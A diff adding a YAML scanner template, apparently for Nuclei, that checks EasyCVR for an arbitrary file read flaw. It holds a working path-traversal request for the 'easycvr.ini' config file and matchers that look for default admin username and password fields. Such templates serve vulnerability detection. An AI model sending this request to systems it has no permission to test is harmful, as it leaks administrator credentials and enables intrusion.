@@ -1,0 +1,30 @@
+id: poc-yaml-easy-cvr-taillog-anyfile-read
+info:
+  name: EasyCVR Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,easycvr
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/taillog/oxsecl/..\\easycvr.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "text/plain"
+      - type: word
+        part: body
+        words:
+          - "default_admin_user="
+          - "default_admin_password="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+        condition: and
